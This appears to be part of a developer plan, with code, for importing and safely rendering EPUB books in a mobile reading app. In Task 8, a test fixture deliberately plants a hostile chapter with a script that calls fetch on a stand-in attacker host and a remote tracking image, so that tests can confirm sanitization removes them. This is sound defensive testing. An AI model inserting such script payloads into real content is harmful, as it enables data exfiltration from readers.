  // node, which are for OUR generated topics. A third-party EPUB has no `$…$`
  // contract with us, and running KaTeX over arbitrary prose would corrupt
  // ordinary text that happens to contain dollar signs.
  return (
    <View style={styles.container}>
      <style data-mentible-reader="">{READER_CSS}</style>
      <div
        ref={ref}
        className={READER_ROOT_CLASS}
        // SAFE: `html` is the output of renderChapterToSafeHtml.
        dangerouslySetInnerHTML={{ __html: html }}
      />
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: colors.background },
});
```

**6b — the native stub.** Create `mobile/src/reader/NativeChapterReader.tsx`, mirroring `NativeTopicReader.tsx`:

```tsx
// Native stub. Metro resolves `NativeChapterReader.web.tsx` on web and this file
// everywhere else, which is what keeps DOMPurify out of the native bundle.
//
// It should never render: `ChapterRenderer` guards on `Platform.OS === "web"`.
// Throwing makes a wiring mistake loud instead of shipping a blank screen.
import type { ImportedChapter } from "@/types/book";

export function NativeChapterReader(_props: { chapter: ImportedChapter }): never {
  throw new Error(
    "NativeChapterReader is web-only. Native must render ChapterRenderer's WebView path.",
  );
}
```

**6c — the platform switch.** In `mobile/src/components/LessonRenderer.tsx`, beside `TopicRenderer`, reusing the existing `HtmlView` host:

```tsx
import type { GeneratedTopic, ImportedChapter } from "@/types/book";
import { buildChapterHtml, buildTopicHtml } from "@/components/contentHtml";
import { NativeChapterReader } from "@/reader/NativeChapterReader";

/**
 * Renders one chapter of an IMPORTED book. Same platform split as
 * `TopicRenderer`: web gets the real DOM (selection, find-in-page, bundled
 * fonts), native gets the same content through the WebView.
 */
export function ChapterRenderer({ chapter }: { chapter: ImportedChapter }) {
  if (Platform.OS === "web") return <NativeChapterReader chapter={chapter} />;
  return <WebViewChapterRenderer chapter={chapter} />;
}

function WebViewChapterRenderer({ chapter }: { chapter: ImportedChapter }) {
  const html = useMemo(() => buildChapterHtml(chapter), [chapter]);
  return <HtmlView html={html} label="Chapter content" />;
}
```

**6d — the read-only chapter route.** Create `mobile/app/book/chapter/[bookId]/[chapterId].tsx`:

```tsx
import React, { useEffect, useState } from "react";
import { ActivityIndicator, ScrollView, StyleSheet, Text, View } from "react-native";
import { useLocalSearchParams } from "expo-router";
import { loadBook } from "@/storage/bookStore";
import { ChapterRenderer } from "@/components/LessonRenderer";
import { PageContainer } from "@/components/PageContainer";
import { colors, spacing, typography } from "@/constants/theme";
import type { ImportedChapter } from "@/types/book";

// One chapter of an IMPORTED book (Open Shelves F1). Deliberately read-only:
// unlike the topic screen there is no Regenerate, no enhancement instructions,
// and no trust manifest. The text is a third party's public-domain work — it is
// not ours to rewrite, and not ours to attest to (ADR-028: we are a catalog
// client; the content never touched our infrastructure).
export default function ReadChapterScreen() {
  const { bookId, chapterId } = useLocalSearchParams<{ bookId: string; chapterId: string }>();
  const [chapter, setChapter] = useState<ImportedChapter | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    let mounted = true;
    (async () => {
      const book = bookId ? await loadBook(bookId) : null;
      if (mounted) {
        setChapter(book?.chapters?.[chapterId] ?? null);
        setLoading(false);
      }
    })();
    return () => {
      mounted = false;
    };
  }, [bookId, chapterId]);

  if (loading) {
    return (
      <View style={styles.centered}>
        <ActivityIndicator size="large" color={colors.primary} />
      </View>
    );
  }

  if (!chapter) {
    return (
      <View style={styles.centered}>
        <Text style={styles.missing}>That chapter is no longer available.</Text>
      </View>
    );
  }

  return (
    <ScrollView style={styles.scroll}>
      <PageContainer>
        <ChapterRenderer chapter={chapter} />
      </PageContainer>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  scroll: { flex: 1, backgroundColor: colors.background },
  centered: {
    flex: 1,
    alignItems: "center",
    justifyContent: "center",
    padding: spacing.lg,
    backgroundColor: colors.background,
  },
  missing: { fontSize: typography.sizeMd, color: colors.textSecondary, textAlign: "center" },
});
```

**6e — make `TopicReadList` see chapters, and route them.** In `mobile/src/components/TopicReadList.tsx`, `flatten` must count a chapter as content and say which kind it is:

```tsx
interface TopicEntry {
  id: string;
  title: string;
  subject: string;
  hasContent: boolean;
  kind: "topic" | "chapter";
}

function flatten(book: Book): TopicEntry[] {
  const content = book.content ?? {};
  const chapters = book.chapters ?? {};
  const out: TopicEntry[] = [];
  for (const s of book.toc.subjects) {
    for (const u of s.units) {
      if (!u.id) continue;
      const chapter = chapters[u.id];
      out.push({
        id: u.id,
        title: u.title,
        subject: s.subject_label,
        hasContent: chapter ? true : hasRenderableLesson(content[u.id]),
        kind: chapter ? "chapter" : "topic",
      });
    }
  }
  return out;
}
```

Widen `onOpen` to carry the kind, and pass it at the call site:

```tsx
onOpen: (id: string, kind: "topic" | "chapter") => void;
// …
onPress={() => onOpen(t.id, t.kind)}
```

In `mobile/app/book/read/[id].tsx`:

```tsx
<TopicReadList
  book={book}
  onOpen={(id, kind) =>
    router.push(
      kind === "chapter" ? `/book/chapter/${book.id}/${id}` : `/book/topic/${book.id}/${id}`,
    )
  }
/>
```

**6f — test it.** Add `mobile/__tests__/components/TopicReadList.chapters.test.tsx`:

```tsx
import React from "react";
import { fireEvent, render, screen } from "@testing-library/react-native";
import { TopicReadList } from "@/components/TopicReadList";
import type { Book } from "@/types/book";

const importedBook = {
  id: "bk-1",
  title: "Frankenstein",
  toc: { subjects: [{ subject_label: "Novel", units: [{ id: "bk-1-ch1", title: "Letter 1" }] }] },
  chapters: {
    "bk-1-ch1": {
      chapterId: "bk-1-ch1",
      title: "Letter 1",
      html: "<p>hi</p>",
      images: {},
      importedAt: "2026-07-16T00:00:00.000Z",
    },
  },
} as unknown as Book;

it("shows an imported book's chapters as readable", () => {
  // Regression: flatten() read book.content only, so an imported book (which has
  // book.chapters and NO content) rendered an empty list — the book was invisible.
  const onOpen = jest.fn();
  render(<TopicReadList book={importedBook} onOpen={onOpen} />);
  fireEvent.press(screen.getByLabelText("Read topic: Letter 1"));
  expect(onOpen).toHaveBeenCalledWith("bk-1-ch1", "chapter");
});
```

Run: `cd mobile && npx jest __tests__/components/TopicReadList.chapters.test.tsx`
Expected: FAIL first (`Unable to find an element with accessibilityLabel: Read topic: Letter 1` — the list renders `null`), PASS after 6e.

- [ ] **Step 7: Help (Definition of Done — the coverage gate fails without this)**

```ts
// mobile/src/help-content/features.ts
  { key: "imported-books", label: "Reading imported books" },
```

```ts
// mobile/src/help-content/topics.ts — add a topic
  {
    id: "imported-books",
    title: "Reading a book you imported",
    featureKey: "imported-books",
    keywords: ["epub", "import", "open", "downloaded", "shelves", "read"],
    blocks: [
      {
        kind: "text",
        text: "A book you download from Open Shelves can be opened and read inside Mentible. Tap Open on the Downloads screen and it joins your Library. On the web app, use \"Import an EPUB\" and pick the file you downloaded — browsers don't let us read it for you.",
      },
      {
        kind: "steps",
        steps: [
          "Download a book from a catalog on the Shelves tab.",
          "Open Downloads and tap Open next to the book.",
          "The book appears in your Library and opens in the reader.",
        ],
      },
      {
        kind: "defs",
        defs: [
          { term: "Does the book leave my device?", def: "No. It's unzipped and stored on this device. Opening a book makes no network request — pictures inside the book are read from the book itself, and anything it tries to load from the internet is dropped." },
          { term: "Why doesn't it look like the original?", def: "We render the book's text in Mentible's own typography and drop the book's styling. Its pictures are kept." },
          { term: "Copy-protected books", def: "Books with DRM can't be opened here, and Mentible will say so rather than showing you a broken book." },
        ],
      },
    ],
  },
```

- [ ] **Step 8: Run the full suite + the coverage gate**

Run: `cd mobile && npx jest && npx tsc --noEmit && npx eslint .`
Expected: all suites pass (754 + this plan's new tests), tsc 0 errors, eslint clean.

- [ ] **Step 9: Commit**

```bash
git add mobile/app/shelves/downloads.tsx mobile/app/\(tabs\)/shelves.tsx \
        mobile/app/book/chapter/ mobile/app/book/read/\[id\].tsx \
        mobile/src/reader/NativeChapterReader.tsx mobile/src/reader/NativeChapterReader.web.tsx \
        mobile/src/components/LessonRenderer.tsx mobile/src/components/TopicReadList.tsx \
        mobile/src/help-content/ mobile/__tests__/
git commit -m "feat(open-shelves): Open a downloaded book (native) + Import an EPUB (web) + Help

Closes the read path: a downloaded book now opens in the reader instead of only
being deletable. Web imports from a file picker because the browser download is
fire-and-forget and routing book content through our backend is forbidden
(ADR-028 D2). Import failures are shown, not swallowed.

Imported chapters get their own read-only route rather than reusing the topic
screen, which is an authoring surface — routing third-party public-domain text
through it would have offered 'Regenerate this topic' on Frankenstein. Also
fixes TopicReadList, whose flatten() read book.content only and so rendered an
imported book as an empty list."
```

---

## Task 8: End-to-end on a real EPUB fixture

**Files:**
- Create: `mobile/assets/test-epubs/build-fixture.mjs`
- Create: `mobile/__tests__/openshelves/epub-e2e.test.ts`

**Interfaces:**
- Consumes: everything above.

**Why:** every test so far builds its zip inline. This one proves the whole chain on a **real, hand-built EPUB** — the spec asks for fixtures, not mocks.

- [ ] **Step 1: Write the fixture builder**

```js
// mobile/assets/test-epubs/build-fixture.mjs
// Builds the F1 test EPUBs. Run: node mobile/assets/test-epubs/build-fixture.mjs
// Checked-in output is what the tests read; regenerate only when the shape changes.
import { zipSync, strToU8 } from "fflate";
import { writeFileSync } from "node:fs";

const container = `<?xml version="1.0"?><container version="1.0"
  xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles>
  <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
</rootfiles></container>`;

const opf = `<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" xmlns:dc="http://purl.org/dc/elements/1.1/" version="3.0">
  <metadata>
    <dc:title>The Test Book</dc:title>
    <dc:creator>A. Fixture</dc:creator>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="c1" href="text/ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="c2" href="text/ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="img" href="images/plate.png" media-type="image/png"/>
  </manifest>
  <spine><itemref idref="c1"/><itemref idref="c2"/></spine>
</package>`;

// A 1x1 PNG.
const png = Uint8Array.from(atob(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
), (c) => c.charCodeAt(0));

writeFileSync("mobile/assets/test-epubs/good.epub", zipSync({
  "mimetype": strToU8("application/epub+zip"),
  "META-INF/container.xml": strToU8(container),
  "OEBPS/content.opf": strToU8(opf),
  "OEBPS/text/ch1.xhtml": strToU8(`<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>
    <h1>The First Chapter</h1><p>Real prose.</p><img src="../images/plate.png" alt="A plate"/>
  </body></html>`),
  "OEBPS/text/ch2.xhtml": strToU8(`<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>
    <h1>The Second Chapter</h1><p>More prose.</p>
    <script>fetch('https://evil.example/steal')</script>
    <img src="https://evil.example/track.png"/>
  </body></html>`),
  "OEBPS/images/plate.png": png,
}));

writeFileSync("mobile/assets/test-epubs/drm.epub", zipSync({
  "META-INF/container.xml": strToU8(container),
  "META-INF/encryption.xml": strToU8("<encryption/>"),
  "OEBPS/content.opf": strToU8(opf),
}));

console.log("wrote good.epub + drm.epub");
```

Run: `node mobile/assets/test-epubs/build-fixture.mjs`
Expected: `wrote good.epub + drm.epub`

- [ ] **Step 2: Write the end-to-end test**

> **⚠ AMENDED DURING EXECUTION (2026-07-16). The original Step 2 was a TRAP.**
> It was written against the **pre-redesign** Task 3 and asserted
> `expect(ch1.html).toContain("data:image/png;base64,")`,
> `expect(ch1.html).not.toContain("plate.png")`,
> `expect(ch2.html).not.toContain("evil.example")` and
> `expect(ch2.html).not.toContain("<script")`.
>
> **All four are now false by design.** Task 3 was redesigned after five
> consecutive regex failures: import stores chapter HTML **RAW** plus an
> `images` map, and the no-network guarantee moved to the **render boundary**.
> Task 4's review confirmed it explicitly — "chapter HTML === raw input
> byte-for-byte (decoy src + `<script>` untouched, **as intended now**)".
>
> An implementer handed those assertions would have made them pass by
> **reintroducing the rewrite that was deleted** — the plan actively steering
> the code back into the bug. Rewritten below to test the architecture that
> exists: import keeps the bytes honest, **render** makes them safe. An
> end-to-end test that stops at import proves nothing about what a user sees.
>
> Key seam (verified in `epubReader.ts:113`, `images[src] = z.files[imgKey]`):
> the map is keyed by the **raw `src` string** as written in the chapter
> (`"../images/plate.png"`), NOT by the resolved zip path — the resolved path
> only fetches the bytes. The render hook looks up `hasOwnProperty(images, src)`
> against that same raw string, so the two match. Assert the raw key.

```ts
// mobile/__tests__/openshelves/epub-e2e.test.ts
/**
 * @jest-environment jsdom
 */
// jsdom: the security half of this test renders through the WEB boundary, and
// DOMPurify needs a real DOM. (RNTL's default environment has none.)
jest.mock("@/storage/bookStore", () => ({ saveBook: jest.fn(async () => {}) }));
jest.mock("@/lib/uuid", () => ({ randomUUID: () => "bk-e2e" }));

import { readFileSync } from "node:fs";
import { importEpub } from "@/openshelves/importEpub";
import { renderChapterToSafeHtml } from "@/reader/renderContent";
import { EpubError } from "@/storage/epubZip";

const good = () => new Uint8Array(readFileSync("assets/test-epubs/good.epub"));
const drm = () => new Uint8Array(readFileSync("assets/test-epubs/drm.epub"));

describe("F1 end-to-end on a real EPUB — import keeps the bytes, render makes them safe", () => {
  it("imports a real EPUB: metadata, spine order, and a working TOC", async () => {
    const book = await importEpub(good());
    expect(book.title).toBe("The Test Book");
    expect(book.metadata?.author).toBe("A. Fixture");
    expect(book.source).toBe("imported");
    expect(book.toc.subjects[0].units.map((u) => u.title))
      .toEqual(["The First Chapter", "The Second Chapter"]);
  });

  it("stores the chapter RAW and carries its image in the map, keyed by the src as written", async () => {
    // The refs-in-schema shape (mirrors media slice 1): bytes live beside the
    // HTML, not inside it. Import does NOT rewrite tags — five regex attempts
    // proved that unwinnable on a DOM-less platform.
    const book = await importEpub(good());
    const ch1 = Object.values(book.chapters!)[0];
    expect(ch1.html).toContain("../images/plate.png");       // raw, untouched
    expect(ch1.images["../images/plate.png"]).toMatch(/^data:image\/png;base64,/);
  });

  it("keeps a hostile chapter's bytes verbatim at rest — the guarantee is at RENDER, not import", async () => {
    const book = await importEpub(good());
    const ch2 = Object.values(book.chapters!)[1];
    expect(ch2.html).toContain("evil.example"); // BY DESIGN. See the render test below.
    expect(ch2.html).toContain("<script");      // BY DESIGN.
  });

  it("RENDER resolves the book's own image from the map and keeps its alt text", async () => {
    const book = await importEpub(good());
    const html = renderChapterToSafeHtml(Object.values(book.chapters!)[0]);
    expect(html).toContain("data:image/png;base64,");
    expect(html).toContain('alt="A plate"');
    expect(html).not.toContain("../images/plate.png"); // the zip path is gone
    expect(html).toContain("Real prose.");             // the real content survives
  });

  it("RENDER drops the chapter's script and its remote tracking image", async () => {
    const book = await importEpub(good());
    const html = renderChapterToSafeHtml(Object.values(book.chapters!)[1]);
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("<script");
    expect(html).toContain("More prose."); // over-refusal check: real content survives
  });

  it("refuses a DRM'd book with a message a user can act on", async () => {
    await expect(importEpub(drm())).rejects.toBeInstanceOf(EpubError);
    await expect(importEpub(drm())).rejects.toThrow(/copy-protected/i);
  });
});
```

**On the `fetch` spy that used to live here: it was deleted, deliberately.**
Task 5's review already established that `expect(fetch).not.toHaveBeenCalled()`
in this chain **cannot fail** — nothing in `importEpub` references `fetch`, and
the reviewer grepped the whole chain to confirm it. It is a tripwire, not a
check, and this plan has now shipped four guards named for something they don't
check (a dead byte cap, a vacuous fetch spy, a `strips EXIF` test that asserted
nothing, a help gate that passed through the bug). The real property — "no
surviving reference a browser could fetch" — is what the two RENDER tests above
assert, and unlike a spy they fail when it regresses.

- [ ] **Step 3: Run it**

Run: `cd mobile && npx jest __tests__/openshelves/epub-e2e.test.ts`
Expected: PASS — 6 tests.

- [ ] **Step 4: Run everything**

Run: `cd mobile && npx jest && npx tsc --noEmit && npx eslint .`
Expected: all green.

- [ ] **Step 5: Commit**

```bash
git add mobile/assets/test-epubs/ mobile/__tests__/openshelves/epub-e2e.test.ts
git commit -m "test(open-shelves): F1 end-to-end on a real hand-built EPUB fixture

Real fixtures, not mocks (spec). Proves the whole chain: metadata, spine order,
in-zip image inlined with its alt, script + remote tracking image dropped, fetch
never called, DRM refused with an actionable message."
```

---

## Self-Review

**1. Spec coverage**

| Spec | Task |
|---|---|
| A-I1 `epubReader.ts` (+ reuse `epubCover.ts` per the revision) | 1, 2 |
| A-I2 `epubToBook.ts` pure mapping | 4 |
| A-I3 `importEpub.ts` atomic orchestration | 5 |
| A-I4 reader + Library integration | 6, 7 |
| D-I1 parse into our own reader | 2 |
| D-I2 imported book first-class in the Library (`source`) | 4, 7 |
| D-I3 our typography, images kept, EPUB CSS dropped | 3 |
| D-I4 (revised) parse at import, **sanitize at render** | 3, 6 |
| D-I5 web imports from a file picker | 7 |
| D-I6 (new) WebView self-contained → DOMPurify inlined | 6 |
| Security: scripts stripped (both surfaces) | 6 |
| Security: no phone-home, `fetch` spied | 3, 5, 8 |
| Security: zip bomb, DRM, entity expansion | 1, 2 |
| Error handling: malformed fails loudly, nothing persisted | 5 |
| Error handling: empty chapter kept | 2, 4 |
| Testing: real fixtures | 8 |
| Definition of Done: `FEATURES` + Help topic | 7 |

**Gap found and closed:** the spec's threat table says *"Path traversal (`../`) in zip entries → rejected. Nothing is written outside the book's own storage."* F1 as planned **writes no files at all** — chapters are stored as HTML strings in the book record, and images become `data:` URIs in memory. There is no filesystem write to traverse into. `resolve()` (Task 2) still collapses `..` so a crafted href cannot escape the zip's own namespace when looked up. Recorded here rather than adding a test for a filesystem write that does not exist.

**2. Placeholder scan:** none — every step carries its code and its exact command.

**3. Type consistency:** `EpubZip`/`EpubError`/`openEpub` (T1) → consumed T2. `SpineItem`/`ParsedEpub`/`readEpub` (T2) → consumed T3, T4. `rewriteChapterHtml` (T3) → consumed T4. `ImportedChapter`/`epubToBook` (T4) → consumed T5, T6. `importEpub` (T5) → consumed T7, T8. `renderChapterToHtml` (T6, in `topicHtml.ts`) → consumed by `buildChapterHtml` (T6). Names match across tasks.

**Known risk, flagged not hidden:** Task 6 Step 4's `require("dompurify/dist/purify.min.js.txt")` may not resolve under Metro. The fallback (assetExts + a checked-in copy) is spelled out, including the byte-identical check so the inlined copy cannot drift from the dependency. The implementer should expect to need the fallback.

**Out of scope, but found while planning — the reader's CDN scripts have no SRI.** After #326 removed `marked`, three scripts and one stylesheet remain remote:

```
katex@0.16.9/dist/katex.min.js          crossorigin="anonymous"   integrity= ✗
katex@0.16.9/dist/contrib/auto-render.min.js                      integrity= ✗
mermaid@10.6.1/dist/mermaid.min.js                                integrity= ✗
katex@0.16.9/dist/katex.min.css                                   integrity= ✗
```

Without `integrity="sha384-…"`, a jsdelivr compromise serves arbitrary JS into the reader's WebView — which runs `javaScriptEnabled` with `originWhitelist={["*"]}` and, for F1, renders third-party books. The versions are **pinned**, so the hashes are stable and this is a cheap fix; it is simply not F1's job, and F1 does not make it worse (the DOMPurify F1 adds is **inlined**, not fetched — D-I6).

Worth its own issue. Note the interaction: if the 4.8MB bundling question (#325's deferred half) is ever revisited, bundling removes this exposure entirely rather than mitigating it.
